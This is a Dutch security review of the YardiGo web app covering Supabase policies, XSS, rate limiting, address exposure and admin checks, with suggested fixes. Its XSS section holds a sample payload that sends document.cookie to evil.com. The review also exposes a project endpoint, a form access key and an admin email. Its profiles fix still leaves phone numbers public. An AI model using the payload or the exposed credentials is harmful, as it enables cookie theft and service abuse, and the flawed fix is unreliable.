# YardiGo — Security Review
**Datum:** 13 april 2026  
**Bestand geanalyseerd:** `index.html`, `admin.html`, `supabase-schema.sql`, `supabase-rls-fix.sql`, `spatial-ref-sys-rls-fix.sql`

---

## Overzicht

| # | Onderwerp | Ernst |
|---|-----------|-------|
| 1 | Supabase RLS-policies | 🟡 Waarschuwing |
| 2 | Storage bucket (`listing-photos`) | 🟡 Waarschuwing |
| 3 | Rate limiting | 🔴 Kritiek |
| 4 | Input sanitization / XSS | 🔴 Kritiek |
| 5 | URL-enumeratie & adres-exposure via API | 🟡 Waarschuwing |
| 6 | Feedback/meldingsformulier | 🟡 Waarschuwing |
| 7 | Auth-configuratie & JWT | 🟡 Waarschuwing |

---

## 1. Supabase RLS-policies 🟡 Waarschuwing

### Bevinding A — Telefoon in `profiles` is publiek leesbaar
De SELECT-policy op `profiles` is `USING (true)`. Dit betekent dat **elk veld** van elk profiel — inclusief het `phone`-veld — door anonieme gebruikers kan worden opgehaald via de Supabase REST API of een eenvoudige `select('*')`.

```
GET https://fwehqudhwzcnkcuypuqw.supabase.co/rest/v1/profiles?select=*
```

**Fix:** Beperk welke kolommen zichtbaar zijn voor anonieme gebruikers, of splits de policy op in publieke en privévelden:

```sql
-- Verwijder bestaande policy
DROP POLICY "Iedereen kan profielen bekijken" ON public.profiles;

-- Alleen veilige velden zijn publiek leesbaar
CREATE POLICY "Publieke profiel-velden"
  ON public.profiles FOR SELECT
  USING (true);

-- Voeg phone toe aan een aparte privé-check
-- Optie: phone kolom verwijderen uit profiles en alleen tonen aan owner
CREATE POLICY "Eigen profiel volledig zichtbaar"
  ON public.profiles FOR SELECT
  USING (auth.uid() = id);
```
Of verwijder `phone` als kolom volledig — YardiGo heeft dit veld momenteel niet in de UI.

---

### Bevinding B — `user_id` ontbreekt bij listing-insert (stille insert-fout)
In `index.html` (regels 3191–3217) worden listings in Supabase ingevoegd **zonder `user_id`**:

```js
sbClient.from('listings').insert({
  title: newSale.title, category: 'garagesale',
  address: newSale.address, ...
  // ❌ user_id ontbreekt!
}).then(...).catch(function() {}); // fout wordt genegeerd
```

De RLS-policy `WITH CHECK (auth.uid() = user_id)` blokkeert deze insert volledig. De `.catch(function() {})` slikt de fout in. Resultaat: listings worden **nooit opgeslagen in Supabase** — alleen tijdelijk in geheugen.

**Fix:** Voeg `user_id` toe aan de insert en log fouten:

```js
sbClient.from('listings').insert({
  title: newSale.title,
  user_id: (await sbClient.auth.getUser()).data.user.id,
  category: 'garagesale',
  address: newSale.address,
  // ... overige velden
}).then(function(res) {
  if (res.error) console.error('Listing insert mislukt:', res.error);
}).catch(function(e) { console.error(e); });
```

---

### Bevinding C — RLS op alle tabellen ✅
`profiles`, `listings` en `favorites` hebben alle vier CRUD-policies correct geconfigureerd. `spatial_ref_sys` is gefixed met REVOKE. **Geen verdere actie vereist.**

---

## 2. Storage bucket (`listing-photos`) 🟡 Waarschuwing

### Bevinding — Foto's worden NIET opgeslagen in Supabase Storage
Foto's worden als base64 data-URLs in geheugen opgeslagen (`uploadedPhotos`-array) en worden bij een listing-insert **niet** meegestuurd naar Supabase. De `images TEXT[]`-kolom in de database blijft leeg.

Dit heeft twee gevolgen:
1. Foto's verdwijnen bij paginaverversing.
2. Er is géén Supabase Storage bucket in gebruik — het risico van een open bucket is dus momenteel niet aanwezig, maar de functionaliteit werkt ook niet.

**Fix:** Upload foto's naar Supabase Storage en sla de URL's op:

```js
// Upload foto naar bucket
const fileName = `${userId}/${Date.now()}_${i}.jpg`;
const { data, error } = await sbClient.storage
  .from('listing-photos')
  .upload(fileName, base64ToBlob(photo), { contentType: 'image/jpeg' });

// Sla de publieke URL op in de insert
const { data: urlData } = sbClient.storage
  .from('listing-photos')
  .getPublicUrl(fileName);
photoUrls.push(urlData.publicUrl);
```

**Bucketbeleid zodra je dit implementeert:**
- Zet de bucket op **privé** (niet publiek).
- Voeg een Storage RLS-policy toe: alleen eigenaar mag uploaden, iedereen mag lezen voor actieve listings.

---

## 3. Rate limiting 🔴 Kritiek

### Bevinding A — Geen bescherming tegen spam-listings
Een ingelogde gebruiker kan onbeperkt listings aanmaken via de `submitAdd()`-functie. Er is geen:
- Maximum aantal listings per gebruiker per dag
- CAPTCHA of Turnstile
- Tijdsvertraging of cooldown

**Fix (database-niveau):** Voeg een CHECK of trigger toe in Supabase:

```sql
-- Max 10 actieve listings per gebruiker
CREATE OR REPLACE FUNCTION check_listing_limit()
RETURNS TRIGGER AS $$
BEGIN
  IF (SELECT COUNT(*) FROM public.listings
      WHERE user_id = NEW.user_id AND status = 'active') >= 10 THEN
    RAISE EXCEPTION 'Maximaal 10 actieve listings per gebruiker';
  END IF;
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER enforce_listing_limit
  BEFORE INSERT ON public.listings
  FOR EACH ROW EXECUTE FUNCTION check_listing_limit();
```

**Fix (frontend-niveau):** Voeg Cloudflare Turnstile toe (gratis, GDPR-vriendelijk):

```html
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async></script>
<!-- In het add-formulier: -->
<div class="cf-turnstile" data-sitekey="JOUW_SITEKEY"></div>
```

---

### Bevinding B — Geen throttle op feedback/meldingsknop
De "Verstuur"-knop wordt na het klikken `disabled` gezet maar herstelt na elke respons. Er is geen vertraging tussen verzendingen.

**Fix:** Voeg een cooldown toe:

```js
let feedbackLastSent = 0;
function sendFeedback() {
  if (Date.now() - feedbackLastSent < 30000) {
    toast('Even wachten voor je opnieuw kunt sturen.'); return;
  }
  feedbackLastSent = Date.now();
  // ... rest van de functie
}
```

---

## 4. Input sanitization & XSS 🔴 Kritiek

### Bevinding — `s.title` en tags worden unsanitized in innerHTML ingevoegd

Op meerdere plaatsen wordt gebruikersinvoer direct in HTML geïnjecteerd via `innerHTML` zonder enige escaping:

```js
// Regel 1738: titel zonder escaping
'<div style="font-size:14px;font-weight:700">' + s.title + '</div>'

// Regel 2499: tags zonder escaping
var tags = (s.tags || []).map(function(tg) {
  return '<span class="ctag ' + s.type + '">' + tg + '</span>';
}).join('');

// Regel 2511: titel in kaartweergave
'<div class="card-title">' + s.title + '</div>'

// Regel 3709: titel als title-attribuut in SVG (ook XSS-vector)
+ '" title="' + sale.title + '">'
```

Een aanvaller kan een listing aanmaken met als titel:
```
<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
```
Zodra andere gebruikers de app openen, voert hun browser dit script uit.

**Fix:** Voeg een escapeHtml-functie toe en gebruik deze overal:

```js
function escapeHtml(str) {
  if (str == null) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

Vervang alle gevallen als volgt:
```js
// Fout:
'<div>' + s.title + '</div>'
// Goed:
'<div>' + escapeHtml(s.title) + '</div>'
```

Alternatiefis DOMPurify (robuuster voor rijke content):
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.1.6/purify.min.js"></script>
```

---

## 5. URL-enumeratie & adresblurring 🟡 Waarschuwing

### Bevinding A — URL-enumeratie geen risico ✅
Listing-IDs zijn Supabase UUIDs (`gen_random_uuid()`). Niet sequentieel, niet voorspelbaar. De deellink `yardigo.nl/v/[uuid]` is niet enumereerbaar. **Geen actie vereist.**

### Bevinding B — Adresblurring is puur cosmetisch (privacy-lek)
In de kaartweergave worden adressen voor gastgebruikers "geblurd":

```js
var addr = isGuest
  ? '📍 ' + city + ' · <span style="filter:blur(3.5px);user-select:none">Straatnaam 00</span> 🔒'
  : '📍 ' + s.address;
```

Het volledige adres staat echter gewoon in de `sales`-array in het geheugen van de browser. Elke gast kan via de browserconsole uitvoeren:

```js
sales[0].address  // → "Keizersgracht 123, Amsterdam"
```

De bedoeling is waarschijnlijk om inloggen te stimuleren, maar het geeft een vals veiligheidsgevoel. Het echte adres wordt **al door de API teruggegeven** aan anonieme gebruikers door de RLS-policy `USING (status = 'active' OR auth.uid() = user_id)`.

**Fix:** Stuur het exacte adres pas terug na authenticatie. Dit vereist een Supabase Edge Function of een aparte RPC-aanroep die alleen het volledige adres teruggeeft voor ingelogde gebruikers:

```sql
-- Aparte functie die adres teruggeeft alleen voor auth users
CREATE OR REPLACE FUNCTION get_listing_address(listing_id UUID)
RETURNS TEXT AS $$
  SELECT address FROM public.listings
  WHERE id = listing_id
    AND (status = 'active')
    AND auth.uid() IS NOT NULL;
$$ LANGUAGE sql SECURITY DEFINER;
```

---

## 6. Feedback/meldingsformulier 🟡 Waarschuwing

### Bevinding — Web3Forms access_key publiek in broncode
De Web3Forms sleutel `d773551b-e958-449f-b60a-5aab393f6c0a` staat zichtbaar in `index.html` (regel 3945) en `admin.html`. Dit is inherent aan client-side formulieren en bij Web3Forms by design. Het risico is dat iemand jouw key gebruikt om mails te sturen namens YardiGo, tot het maandlimiet (250 gratis verzendingen/maand).

**Maatregelen:**
- Activeer de **domain-restrictie** in het Web3Forms dashboard zodat de key alleen werkt van `yardigo.nl`.
- Houd het maandlimiet in de gaten in het Web3Forms dashboard.

---

## 7. Auth-configuratie & JWT 🟡 Waarschuwing

### Bevinding A — Admin-check is client-side only
In `admin.html` (regel 793) wordt de admincontrole puur client-side gedaan:

```js
if (data.user.email !== ADMIN_EMAIL) {
  await sb.auth.signOut();
  errEl.textContent = '❌ Geen admin-rechten.';
  return;
}
```

Als iemand toegang krijgt tot het admin-paneel (URL `/admin`), kan hij de check omzeilen door de JavaScript te patchen. De Supabase-aanroepen die daarna worden gedaan hebben wél de normale RLS-bescherming, maar admin.html heeft toegang tot gevoelige functies (badges toekennen, gebruikers zien).

**Fix:** Voeg een server-side admin-rol toe via Supabase custom claims of een `is_admin` kolom in `profiles` die alleen via de service-rol kan worden gezet. Verifieer dit in RLS-policies:

```sql
-- In profiles tabel
ALTER TABLE public.profiles ADD COLUMN IF NOT EXISTS is_admin BOOLEAN DEFAULT FALSE;

-- Admin-acties vereisen is_admin = true
CREATE POLICY "Alleen admins kunnen badges updaten"
  ON public.profiles FOR UPDATE
  USING (
    EXISTS (
      SELECT 1 FROM public.profiles
      WHERE id = auth.uid() AND is_admin = TRUE
    )
  );
```

---

### Bevinding B — Geen MFA/2FA 🟡
Er is geen multi-factor authenticatie ingeschakeld. Voor gewone gebruikers is dit acceptabel; voor het admin-account (`yardigo.app@gmail.com`) is dit een risico.

**Fix:** Schakel MFA in via Supabase Dashboard → Authentication → Multi-factor authentication. Dit is optioneel maar sterk aanbevolen voor het admin-account.

---

### Bevinding C — JWT-sessieduur ✅
Supabase gebruikt standaard 1 uur JWT-geldigheid met automatische refresh via refresh token. Dit is acceptabel. **Geen actie vereist.**

---

## Prioriteitenlijst

| Prioriteit | Actie |
|-----------|-------|
| 🔴 Nu | Voeg `escapeHtml()` toe aan alle innerHTML-concatenaties |
| 🔴 Nu | Voeg `user_id` toe aan listing-inserts + verwijder stille catch |
| 🔴 Nu | Implementeer rate limiting op listing-aanmaak (DB-trigger) |
| 🟡 Binnenkort | Beperk publieke SELECT op `profiles` (verberg `phone`) |
| 🟡 Binnenkort | Adresblurring server-side maken (of accepteren dat het cosmetisch is) |
| 🟡 Binnenkort | Foto-upload naar Supabase Storage implementeren |
| 🟡 Binnenkort | Domain-restrictie instellen in Web3Forms dashboard |
| 🟡 Later | Admin-rol server-side afdwingen via RLS + is_admin kolom |
| 🟡 Later | MFA inschakelen voor admin-account |
